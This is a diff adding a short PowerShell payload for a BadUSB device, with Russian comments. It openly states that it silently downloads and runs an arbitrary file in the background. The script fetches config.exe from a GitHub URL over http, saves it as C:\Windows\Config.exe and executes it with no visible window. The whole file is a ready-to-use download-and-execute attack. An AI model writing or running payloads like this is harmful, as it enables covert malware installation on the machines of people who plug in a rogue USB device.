@@ -1,0 +1,9 @@
+# Payload 1 для BadUSB
+# Задача: Скачать и запустить любой файл (хоть EXE, хоть MP3)
+# Этот файл нагрузки будет выполняться в фоновом режиме без видимых окон, и его размер может быть любым (в нём нет лимита на 259 символов)
+
+$url_file = 'http://github.com/Sevka133/badusb/raw/refs/heads/main/config.exe' #Ссылка на файл, обязательно http (не https) и в кавычках
+$file = 'C:\Windows\Config.exe'#Под каким названием сохранить файл, так же можно указать путь ""
+
+PowerShell (New-Object System.Net.WebClient).DownloadFile($url_file,$file), #Запуск PowerShell с передачей ему строки для скачивания файла
+(New-Object -com Shell.Application).ShellExecute($file);  #Строчка для запуска файла, который мы скачали
